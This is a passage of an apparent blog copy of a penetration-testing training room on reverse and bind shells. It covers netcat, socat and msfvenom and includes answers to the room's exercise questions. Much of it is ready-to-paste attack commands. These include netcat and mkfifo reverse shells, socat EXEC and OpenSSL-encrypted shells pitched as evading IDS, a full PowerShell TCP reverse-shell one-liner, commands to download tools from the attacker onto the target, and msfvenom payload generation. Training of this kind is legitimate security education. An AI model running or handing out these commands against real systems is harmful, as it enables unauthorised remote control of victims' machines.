+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -lvnp 443</span><br></pre></td></tr></table></figure>
+
+<p>On the target: </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312202043855.png" alt="rN7YkJJ"></p>
+<p>Notice that after running the command on the right, the listener receives a connection. When the whoami command is run, we see that we are executing commands as the target user. The important thing here is that we are <em>listening</em> on our own attacking machine, and sending a connection <em>from</em> the target.</p>
+<h2 id="Bind-Shell-example"><a href="#Bind-Shell-example" class="headerlink" title="Bind Shell example:"></a><em>Bind Shell example:</em></h2><p>Bind shells are less common, but still very useful.</p>
+<p>Once again, take a look at the following image. Again, on the left we have the attacker’s computer, on the right we have a simulated target. Just to shake things up a little, we’ll use a Windows target this time. First, we start a listener on the target – this time we’re also telling it to execute <code>cmd.exe</code>. Then, with the listener up and running, we connect from our own machine to the newly opened port.</p>
+<p>On the target: </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt; -e &quot;cmd.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>On the attacking machine:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.10.25.139 &lt;port&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312202044291.png" alt="6GUwZsw"></p>
+<p>As you can see, this once again gives us code execution on the remote machine. Note that this is not specific to Windows.</p>
+<p>The important thing to understand here is that we are <em>listening</em> on the target, then connecting to it with our own machine.</p>
+<hr>
+<p>The final concept which is relevant in this task is that of interactivity. Shells can be either <em>interactive</em> or <em>non-interactive</em>.</p>
+<ul>
+<li><p><em>Interactive:</em> If you’ve used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to interactive shells. These allow you to interact with programs after executing them. For example, take the SSH login prompt:<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312202047875.png" alt="0ayLj8L"><br>Here you can see that it’s asking <em>interactively</em> that the user type either yes or no in order to continue the connection. This is an interactive program, which requires an interactive shell in order to run.<br>在这里，您可以看到它以交互方式询问用户键入“是”或“否”以继续连接。这是一个交互式程序，需要交互式 shell 才能运行。</p>
+</li>
+<li><p><em>Non-Interactive</em> shells don’t give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier. Let’s see what happens when we try to run SSH in a non-interactive shell:</p>
+</li>
+</ul>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312202048996.png" alt="rXyEDKU"></p>
+<ul>
+<li>Notice that the <code>whoami</code> command (which is non-interactive) executes perfectly, but the <code>ssh</code> command (which <em>is</em> interactive) gives us no output at all. As an interesting side note, the output of an interactive command <em>does</em> go somewhere, however, figuring out <strong>where</strong> is an exercise for you to attempt on your own. Suffice to say that interactive programs do not work in non-interactive shells.</li>
+</ul>
+<p>Additionally, in various places throughout this task you will see a command in the screenshots called <code>listener</code>. This command is an alias unique to the attacking machine used for demonstrations, and is a shorthand way of typing <code>sudo rlwrap nc -lvnp 443</code>, which will be covered in upcoming tasks. It will <em>not</em> work on any other machine unless the alias has been configured locally.</p>
+<h1 id="Netcat-1"><a href="#Netcat-1" class="headerlink" title="Netcat"></a>Netcat</h1><p>As mentioned previously, Netcat is the most basic tool in a pentester’s toolkit when it comes to any kind of networking. With it we can do a wide variety of interesting things, but let’s focus for now on shells.</p>
+<h2 id="Reverse-Shells"><a href="#Reverse-Shells" class="headerlink" title="Reverse Shells"></a><em>Reverse Shells</em></h2><p>In the previous task we saw that reverse shells require shellcode and a listener. There are <em>many</em> ways to execute a shell, so we’ll start by looking at listeners.</p>
+<p>The syntax for starting a netcat listener using Linux is this:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port-number&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>-l</strong> is used to tell netcat that this will be a listener</li>
+<li><strong>-v</strong> is used to request a verbose output</li>
+<li><strong>-n</strong> tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.</li>
+<li><strong>-p</strong> indicates that the port specification will follow.</li>
+</ul>
+<p>The example in the previous task used port 443. Realistically you could use any port you like, as long as there isn’t already a service using it. Be aware that if you choose to use a port below 1024, you will need to use <code>sudo</code> when starting your listener. That said, it’s often a good idea to use a well-known port number (80, 443 or 53 being good choices) as this is more likely to get past outbound firewall rules on the target.</p>
+<p>A working example of this would be:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -lvnp 443</span><br></pre></td></tr></table></figure>
+
+<p>We can then connect back to this with any number of payloads, depending on the environment on the target.</p>
+<p>An example of this is displayed in the previous task.</p>
+<h2 id="Bind-Shells"><a href="#Bind-Shells" class="headerlink" title="Bind Shells"></a><em>Bind Shells</em></h2><p>If we are looking to obtain a bind shell on a target then we can assume that there is already a listener waiting for us on a chosen port of the target: all we need to do is connect to it. The syntax for this is relatively straight forward:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc &lt;target-ip&gt; &lt;chosen-port&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Here we are using netcat to make an outbound connection to the target on our chosen port.</p>
+<h1 id="Netcat-Shell-Stabilisation"><a href="#Netcat-Shell-Stabilisation" class="headerlink" title="Netcat Shell Stabilisation"></a>Netcat Shell Stabilisation</h1><p>Ok, so we’ve caught or connected to a netcat shell, what next?</p>
+<p>These shells are very unstable by default. Pressing Ctrl + C kills the whole thing. They are non-interactive, and often have strange formatting errors. This is due to netcat “shells” really being processes running <em>inside</em> a terminal, rather than being bonafide terminals in their own right. Fortunately, there are many ways to stabilise netcat shells on Linux systems. We’ll be looking at three here. Stabilisation of Windows reverse shells tends to be significantly harder; however, the second technique that we’ll be covering here is particularly useful for it.</p>
+<hr>
+<h2 id="Technique-1-Python"><a href="#Technique-1-Python" class="headerlink" title="Technique 1: Python"></a><em>Technique 1: Python</em></h2><p>The first technique we’ll be discussing is applicable only to Linux boxes, as they will nearly always have Python installed by default. This is a three stage process:</p>
+<ol>
+<li>The first thing to do is use <code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace <code>python</code> with <code>python2</code> or <code>python3</code> as required. At this point our shell will look a bit prettier, but we still won’t be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.</li>
+<li>Step two is: <code>export TERM=xterm</code> – this will give us access to term commands such as <code>clear</code>.</li>
+<li>Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use <code>stty raw -echo; fg</code>. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.</li>
+</ol>
+<p>The full technique can be seen here:</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312202052488.png" alt="bQnFz1T"></p>
+<p>Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type <code>reset</code> and press enter.</p>
+<hr>
+<h2 id="Technique-2-rlwrap"><a href="#Technique-2-rlwrap" class="headerlink" title="Technique 2: rlwrap"></a><em>Technique 2: rlwrap</em></h2><p>rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell*;* however, s<em>ome</em> manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with <code>sudo apt install rlwrap</code>.</p>
+<p>To use rlwrap, we invoke a slightly different listener:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rlwrap nc -lvnp &lt;port&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Prepending our netcat listener with “rlwrap” gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it’s possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use <code>stty raw -echo; fg</code> to stabilise and re-enter the shell.</p>
+<hr>
+<h2 id="Technique-3-Socat"><a href="#Technique-3-Socat" class="headerlink" title="Technique 3: Socat"></a><em>Technique 3: Socat</em></h2><p>The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a <a target="_blank" rel="noopener" href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true">socat static compiled binary</a> (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (<code>sudo python3 -m http.server 80</code>), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (<code>wget &lt;LOCAL-IP&gt;/socat -O /tmp/socat</code>).</p>
+<p>For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (<code>Invoke-WebRequest -uri &lt;LOCAL-IP&gt;/socat.exe -outfile C:\\Windows\temp\socat.exe</code>). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks.</p>
+<hr>
+<p>With any of the above techniques, it’s useful to be able to change your terminal tty size. This is something that your terminal will do automatically when using a regular shell; however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.</p>
+<p>First, open another terminal and run <code>stty -a</code>. This will give you a large stream of output. Note down the values for “rows” and columns:</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312202052301.png" alt="7aOKtlO"></p>
+<p>Next, in your reverse&#x2F;bind shell, type in:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty rows &lt;number&gt;</span><br></pre></td></tr></table></figure>
+
+<p>and</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty cols &lt;number&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Filling in the numbers you got from running the command in your own terminal.</p>
+<p>This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.</p>
+<h1 id="Socat-1"><a href="#Socat-1" class="headerlink" title="Socat"></a>Socat</h1><p>Socat is similar to netcat in some ways, but fundamentally different in many others. The easiest way to think about socat is as a connector between two points. In the interests of this room, this will essentially be a listening port and the keyboard, however, it could also be a listening port and a file, or indeed, two listening ports. All socat does is provide a link between two points – much like the portal gun from the Portal games!</p>
+<p>Once again, let’s start with reverse shells.</p>
+<h2 id="Reverse-Shells-1"><a href="#Reverse-Shells-1" class="headerlink" title="Reverse Shells"></a><em>Reverse Shells</em></h2><p>As mentioned previously, the syntax for socat gets a lot harder than that of netcat. Here’s the syntax for a basic reverse shell listener in socat:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-L:&lt;port&gt; -</span><br></pre></td></tr></table></figure>
+
+<p>As always with socat, this is taking two points (a listening port, and standard input) and connecting them together. The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to <code>nc -lvnp &lt;port&gt;</code>.</p>
+<p>On Windows we would use this command to connect back:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:powershell.exe,pipes</span><br></pre></td></tr></table></figure>
+
+<p>The “pipes” option is used to force powershell (or cmd.exe) to use Unix style standard input and output.</p>
+<p>This is the equivalent command for a Linux Target:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:&quot;bash -li&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Bind-Shells-1"><a href="#Bind-Shells-1" class="headerlink" title="Bind Shells"></a><em>Bind Shells</em></h2><p>On a Linux target we would use the following command:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-L:&lt;PORT&gt; EXEC:&quot;bash -li&quot;</span><br></pre></td></tr></table></figure>
+
+<p>On a Windows target we would use this command for our listener:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-L:&lt;PORT&gt; EXEC:powershell.exe,pipes</span><br></pre></td></tr></table></figure>
+
+<p>We use the “pipes” argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.</p>
+<p>Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt; -</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>Now let’s take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell. This will only work when the target is Linux, but is <em>significantly</em> more stable. As mentioned earlier, socat is an incredibly versatile tool; however, the following technique is perhaps one of its most useful applications. Here is the new listener syntax:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-L:&lt;port&gt; FILE:`tty`,raw,echo=0</span><br></pre></td></tr></table></figure>
+
+<p>Let’s break this command down into its two parts. As usual, we’re connecting two points together. In this case those points are a listening port, and a file. Specifically, we are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z, <code>stty raw -echo; fg</code> trick with a netcat shell – with the added bonus of being immediately stable and hooking into a full tty.</p>
+<p>The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it’s possible to upload a <a target="_blank" rel="noopener" href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true">precompiled socat binary</a>, which can then be executed as normal.</p>
+<p>The special command is as follows:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane</span><br></pre></td></tr></table></figure>
+
+<p>This is a handful, so let’s break it down.</p>
+<p>The first part is easy – we’re linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with <code>EXEC:&quot;bash -li&quot;</code>. We’re also passing the arguments: pty, stderr, sigint, setsid and sane:</p>
+<ul>
+<li><strong>pty</strong>, allocates a pseudoterminal on the target – part of the stabilisation process</li>
+<li><strong>stderr</strong>, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)</li>
+<li><strong>sigint</strong>, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell</li>
+<li><strong>setsid</strong>, creates the process in a new session</li>
+<li><strong>sane</strong>, stabilises the terminal, attempting to “normalise” it.</li>
+</ul>
+<p>That’s a lot to take in, so let’s see it in action.</p>
+<p>As normal, on the left we have a listener running on our local attacking machine, on the right we have a simulation of a compromised target, running with a non-interactive shell. Using the non-interactive netcat shell, we execute the special socat command, and receive a fully interactive bash shell on the socat listener to the left:</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312202058135.png" alt="etAuYzz"></p>
+<p>Note that the socat shell is fully interactive, allowing us to use interactive commands such as SSH. This can then be further improved by setting the stty values as seen in the previous task, which will let us use text editors such as Vim or Nano.</p>
+<hr>
+<p>If, at any point, a socat shell is not working correctly, it’s well worth increasing the verbosity by adding <code>-d -d</code> into the command. This is very useful for experimental purposes, but is not usually necessary for general use.</p>
+<h1 id="Socat-Encrypted-Shells"><a href="#Socat-Encrypted-Shells" class="headerlink" title="Socat Encrypted Shells"></a>Socat Encrypted Shells</h1><p>One of the many great things about socat is that it’s capable of creating encrypted shells – both bind and reverse. Why would we want to do this? Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a result.</p>
+<p>We covered how to create basic shells in the previous task, so that syntax will not be covered again here. Suffice to say that any time <code>TCP</code> was used as part of a command, this should be replaced with <code>OPENSSL</code> when working with encrypted shells. We’ll cover a few examples at the end of the task, but first let’s talk about certificates.</p>
+<p>We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt</span><br></pre></td></tr></table></figure>
+
+<p>This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.</p>
+<p>We then need to merge the two created files into a single <code>.pem</code> file:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat shell.key shell.crt &gt; shell.pem</span><br></pre></td></tr></table></figure>
+
+<p>Now, when we set up our reverse shell listener, we use:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 -</span><br></pre></td></tr></table></figure>
+
+<p>This sets up an OPENSSL listener using our generated certificate. <code>verify=0</code> tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate <em>must</em> be used on whichever device is listening.</p>
+<p>To connect back, we would use:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify=0 EXEC:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>The same technique would apply for a bind shell:</p>
+<p>Target:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes</span><br></pre></td></tr></table></figure>
+
+<p>Attacker:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat OPENSSL:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt;,verify=0 -</span><br></pre></td></tr></table></figure>
+
+<p>Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.</p>
+<p>The following image shows an OPENSSL Reverse shell from a Linux target. As usual, the target is on the right, and the attacker is on the left:</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312202104476.png" alt="UbOPN9q"></p>
+<p>This technique will also work with the special, Linux-only TTY shell covered in the previous task – figuring out the syntax for this will be the challenge for this task. Feel free to use the Linux Practice box (deployable at the end of the room) to experiment if you’re struggling to obtain the answer.</p>
+<h2 id="Answer-the-questions-below"><a href="#Answer-the-questions-below" class="headerlink" title="Answer the questions below"></a>Answer the questions below</h2><p>What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called “encrypt.pem”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0</span><br></pre></td></tr></table></figure>
+
+<p>If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat OPENSSL:10.10.10.5:53,verify=0 EXEC:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane</span><br></pre></td></tr></table></figure>
+
+<h1 id="Common-Shell-Payloads"><a href="#Common-Shell-Payloads" class="headerlink" title="Common Shell Payloads"></a>Common Shell Payloads</h1><p>We’ll soon be looking at generating payloads with msfvenom, but before we do that, let’s take a look at some common payloads using the tools we’ve already covered.</p>
+<hr>
+<p>A previous task mentioned that we’d be looking at some ways to use netcat as a listener for a bindshell, so we’ll start with that. In some versions of netcat (including the <code>nc.exe</code> Windows version included with Kali at <code>/usr/share/windows-resources/binaries</code>, and the version used in Kali itself: <code>netcat-traditional</code>) there is a <code>-e</code> option which allows you to execute a process on connection. For example, as a listener:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;PORT&gt; -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>Connecting to the above listener with netcat would result in a bind shell on the target.</p>
+<p>Equally, for a reverse shell, connecting back with <code>nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash</code> would result in a reverse shell on the target.</p>
+<p>However, this is not included in most versions of netcat as it is widely seen to be very insecure (funny that, huh?). On Windows where a static binary is nearly always required anyway, this technique will work perfectly. On Linux, however, we would instead use this code to create a listener for a bind shell:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</span><br></pre></td></tr></table></figure>
+
+<p>The following paragraph is the technical explanation for this command. It’s slightly above the level of this room, so don’t worry if it doesn’t make much sense for now – the command itself is what matters.</p>
+<blockquote>
+<p><em>The command first creates a <a target="_blank" rel="noopener" href="https://www.linuxjournal.com/article/2156">named pipe</a> at <code>/tmp/f</code>. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into <code>sh</code>, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.</em></p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312202110261.png" alt="se5Fyn3"></p>
+<p>A very similar command can be used to send a netcat reverse shell:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/f; nc &lt;LOCAL-IP&gt; &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</span><br></pre></td></tr></table></figure>
+
+<p>This command is virtually identical to the previous one, other than using the netcat connect syntax, as opposed to the netcat listen syntax.</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312202110581.png" alt="Xf0hA5p"></p>
+<hr>
+<p>When targeting a modern Windows Server, it is very common to require a Powershell reverse shell, so we’ll be covering the standard one-liner PSH reverse shell here.</p>
+<p>This command is very convoluted, so for the sake of simplicity it will not be explained directly here. It is, however, an extremely useful one-liner to keep on hand:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#x27;**&lt;ip&gt;**&#x27;,**&lt;port&gt;**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span><br></pre></td></tr></table></figure>
+
+<p>In order to use this, we need to replace “&lt;IP&gt;” and “&lt;port&gt;” with an appropriate IP and choice of port. It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a webshell) and executed, resulting in a reverse shell:</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312202111940.png" alt="T6o7kOL"></p>
+<hr>
+<p>For other common reverse shell payloads, [PayloadsAllTheThings](<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology</a> and Resources&#x2F;Reverse Shell Cheatsheet.md) is a repository containing a wide range of shell codes (usually in one-liner format for copying and pasting), in many different languages. It is well worth reading through the linked page to see what’s available.</p>
+<h1 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h1><p>Msfvenom: the one-stop-shop for all things payload related.</p>
+<p>Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit; however, it can also be used to generate payloads in various formats (e.g. <code>.exe</code>, <code>.aspx</code>, <code>.war</code>, <code>.py</code>). It’s this latter function that we will be making use of in this room. There is more to teach about msfvenom than could ever be fit into a single room, let alone a single task, so the following information will be a brief introduction to the concepts that will prove useful for this room.</p>
+<p>The standard syntax for msfvenom is as follows:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p &lt;PAYLOAD&gt; &lt;OPTIONS&gt;</span><br></pre></td></tr></table></figure>
+
+<p>For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&lt;listen-IP&gt; LPORT=&lt;listen-port&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312202112362.png" alt="JkWeFLq"></p>
+<p>Here we are using a payload and four options:</p>
+<ul>
+<li><strong>-f</strong> &lt;format&gt;<ul>
+<li>Specifies the output format. In this case that is an executable (exe)</li>
+</ul>
+</li>
+<li><strong>-o</strong> &lt;file&gt;<ul>
+<li>The output location and filename for the generated payload.</li>
+</ul>
+</li>
